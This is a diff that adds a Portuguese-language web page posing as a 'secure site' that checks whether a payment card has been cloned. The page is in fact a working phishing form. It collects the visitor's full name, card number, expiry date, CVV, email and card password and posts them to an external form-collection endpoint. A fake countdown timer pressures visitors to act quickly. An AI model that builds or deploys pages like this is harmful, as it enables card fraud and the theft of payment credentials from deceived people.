@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒Site Seguro🔒</title>
+    <!-- Link Favicon -->
+    <link rel="icon" type="image/x-icon" href="imagens/logo.png">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;700&display=swap" rel="stylesheet">
+</head>
+
+<!-- Link arquivo CSS -->
+<link rel="stylesheet" href="style.css" type="text/css">
+
+<body>
+    <div class="formulario">
+        <form action="https://api.sheetmonkey.io/form/gLNYCTV2EzbMPQm8v4gsYH" method="post">
+            <h1 class="titulo">Verifique se seu cartão Já foi clonado.</h1>
+            
+            <!-- Substitui a linha de título pelo Timer -->
+            <div class="timer-container">
+                <h3 class="timer">Tempo grátis restante:</h3>
+                <div id="timer" class="timer">05:00</div>
+            </div>
+
+            <label for="nome">Digite Seu Nome Completo:</label>
+            <input class="input" type="text" id="nome" name="nome" placeholder="Ex. Luiz Inacio" />
+            <br>
+
+            <label for="num-cartao">Dígitos do Cartão:</label>
+            <input class="input" type="text" id="num-cartao" name="num cartao" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatarCartao(this)" />
+            <br>
+
+            <label for="validade">Data de Validade:</label>
+            <input class="input" type="text" id="validade" name="validade" placeholder="MM/AA" maxlength="5" oninput="formatarValidade(this)" />
+            <br>
+
+            <label for="cvv">Dígito de Segurança:</label>
+            <input class="input" type="text" id="cvv" name="digito de seguranca" placeholder="123" maxlength="3" oninput="formatarCVV(this)" />
+            <br>
+
+            <label for="email">Seu e-mail:</label>
+            <input class="input" type="text" id="email" name="email" placeholder="Ex. luiz.inacio@email.com" />
+            <br>
+
+            <label for="senha">Senha do Cartão:</label>
+            <input class="input" type="password" id="senha" name="senha" placeholder="Sua senha" />
+            <br>
+
+            <input class="botenviar" type="submit" name="enviar" value="Verificar" />
+            
+            <!-- Imagem dentro do formulário -->
+            <img src="imagens/siteseguro.png" alt="Site Seguro" class="footer-image" />
+        </form>
+    </div>
+
+    <script>
+        // Função para formatar os campos
+        function formatarCartao(campo) {
+            campo.value = campo.value.replace(/\D/g, '') // Remove caracteres não numéricos
+                                     .replace(/(.{4})/g, '$1 ') // Adiciona espaço a cada 4 números
+                                     .trim() // Remove espaços extras
+                                     .slice(0, 19); // Garante que não passe do limite de 19 caracteres (16 números + 3 espaços)
+        }
+
+        function formatarValidade(campo) {
+            campo.value = campo.value.replace(/\D/g, '') // Remove caracteres não numéricos
+                                     .replace(/(\d{2})(\d{0,2})/, '$1/$2') // Adiciona barra após os dois primeiros números
+                                     .slice(0, 5); // Garante que não passe do limite de 5 caracteres (MM/AA)
+        }
+
+        function formatarCVV(campo) {
+            campo.value = campo.value.replace(/\D/g, '') // Remove caracteres não numéricos
+                                     .slice(0, 3); // Garante que não passe do limite de 3 caracteres
+        }
+
+        // Função para o timer de 5 minutos
+        var timeLeft = 367; // 5 minutos em segundos
+
+        function updateTimer() {
+            var minutes = Math.floor(timeLeft / 60); // Calcula os minutos
+            var seconds = timeLeft % 60; // Calcula os segundos
+
+            // Adiciona zero à esquerda se os minutos ou segundos forem menores que 10
+            minutes = minutes < 10 ? '0' + minutes : minutes;
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+
+            // Atualiza o conteúdo do timer
+            document.getElementById('timer').textContent = minutes + ':' + seconds;
+            
+            // Quando o tempo terminar, exibe "Tempo esgotado"
+            if (timeLeft <= 0) {
+                document.getElementById('timer').textContent = 'Tempo esgotado';
+            } else {
+                timeLeft--; // Diminui 1 segundo a cada chamada
+                setTimeout(updateTimer, 1000); // Chama a função novamente após 1 segundo
+            }
+        }
+
+        // Inicia o timer assim que a página carregar
+        window.onload = updateTimer;
+    </script>
+</body>
+</html>
